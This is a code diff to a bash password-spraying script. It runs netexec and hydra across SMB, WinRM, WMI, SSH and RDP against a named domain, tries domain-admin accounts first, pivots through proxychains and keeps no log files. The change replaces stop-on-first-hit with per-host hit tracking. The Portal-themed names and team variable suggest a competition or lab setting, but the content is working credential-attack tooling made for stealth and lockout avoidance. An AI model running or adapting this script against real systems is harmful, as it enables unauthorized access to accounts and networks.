@@ -7,8 +7,8 @@
 # Pre-checks port availability, skips closed services
 # Only prints successful creds — no log files
 #
-# Default: stop at first successful auth on any box/protocol/user
-# -a flag : continue spraying everything after hits (full coverage)
+# Default: stop spraying a host after first hit, continue to other hosts
+# -a flag : continue spraying everything (all users × all hosts × all protocols)
 # -x flag : use internal 172.16.x.x IPs (for proxychains pivot)
 # DA accounts are tried first before users.txt entries
 # ================================================
@@ -68,7 +68,9 @@ PASSES="passwords.txt"
 DOMAIN="aperturesciencelabs.org"
 TIMEOUT=2    # seconds for port check
 GOT_ACCESS=0
-DONE=0       # set to 1 on first hit when CONTINUE_ALL=0
+
+# Per-IP hit tracking: once we get a hit on an IP, skip it for remaining attempts
+declare -A HIT_IPS
 
 # ============== BUILD USER LIST (explicit → DA → users.txt) ==============
 DA_USERS=(Administrator caroline cave chell glados wheatley)
@@ -160,16 +162,24 @@ for proto in smb winrm wmi ssh rdp; do
 done
 
 echo "[*] Users: ${#ALL_USERS[@]} (${#EXTRA_USERS[@]} explicit + ${#DA_USERS[@]} DA + $((${#ALL_USERS[@]}-${#DA_USERS[@]}-${#EXTRA_USERS[@]})) from users.txt)"
-[[ $CONTINUE_ALL -eq 1 ]] && echo "[*] Mode: continue-on-success (full spray)" || echo "[*] Mode: stop-on-first-hit"
+[[ $CONTINUE_ALL -eq 1 ]] && echo "[*] Mode: full spray (all users × all hosts)" || echo "[*] Mode: stop-per-host (skip host after first hit)"
 echo "[*] Starting spray for TEAM ${TEAM} at $(date)"
 echo ""
 
 # ============== HIT HANDLER ==============
 record_hit() {
-  local result="$1"
+  local ip="$1" result="$2"
   echo "$result"
   GOT_ACCESS=1
-  [[ $CONTINUE_ALL -eq 0 ]] && DONE=1
+  if [[ $CONTINUE_ALL -eq 0 ]]; then
+    HIT_IPS["$ip"]=1
+  fi
+}
+
+# Check if an IP has already been hit (skip it unless -a)
+ip_done() {
+  local ip="$1"
+  [[ $CONTINUE_ALL -eq 0 && -n "${HIT_IPS[$ip]:-}" ]]
 }
 
 # ============== SINGLE-ATTEMPT HELPERS ==============
@@ -182,7 +192,7 @@ try_nxc() {
     -u "$user" -p "$pass" -d "$DOMAIN" \
     2>/dev/null | grep -i '\[+\]' || true)
   if [[ -n "$result" ]]; then
-    record_hit "$result"
+    record_hit "$ip" "$result"
     return 0
   fi
   return 1
@@ -194,7 +204,7 @@ try_hydra() {
   result=$(hydra -l "$user" -p "$pass" -t 4 -W 2 "${proto}://${ip}" 2>/dev/null \
     | grep -i 'login:' || true)
   if [[ -n "$result" ]]; then
-    record_hit "$result"
+    record_hit "$ip" "$result"
     return 0
   fi
   return 1
@@ -207,43 +217,37 @@ try_hydra() {
 
 while IFS= read -r pass || [[ -n "$pass" ]]; do
   [[ -z "$pass" ]] && continue
-  [[ $DONE -eq 1 ]] && break
 
   # ---- netexec protocols ----
   for proto in smb winrm wmi; do
-    [[ $DONE -eq 1 ]] && break
     targets="${LIVE_TARGETS[$proto]:-}"
     [[ -z "$targets" ]] && continue
 
     for ip in $targets; do
-      [[ $DONE -eq 1 ]] && break
+      ip_done "$ip" && continue
       for user in "${ALL_USERS[@]}"; do
-        [[ $DONE -eq 1 ]] && break
+        ip_done "$ip" && break
         try_nxc "$proto" "$ip" "$user" "$pass" || true
       done
     done
   done
 
   # ---- hydra protocols ----
-  if [[ $HAVE_HYDRA -eq 0 ]]; then
-    [[ $GOT_ACCESS -eq 0 && $DONE -eq 0 ]] && true  # silently skip
-  else
+  if [[ $HAVE_HYDRA -eq 1 ]]; then
     for proto in ssh rdp; do
-      [[ $DONE -eq 1 ]] && break
       targets="${LIVE_TARGETS[$proto]:-}"
       [[ -z "$targets" ]] && continue
 
       for ip in $targets; do
-        [[ $DONE -eq 1 ]] && break
+        ip_done "$ip" && continue
         for user in "${ALL_USERS[@]}"; do
-          [[ $DONE -eq 1 ]] && break
+          ip_done "$ip" && break
           try_hydra "$proto" "$ip" "$user" "$pass" || true
         done
       done
     done
   fi
 
-  [[ $DONE -eq 1 ]] && break
   # Delay between passwords to avoid lockouts
   sleep 3
 done < "$PASSES"
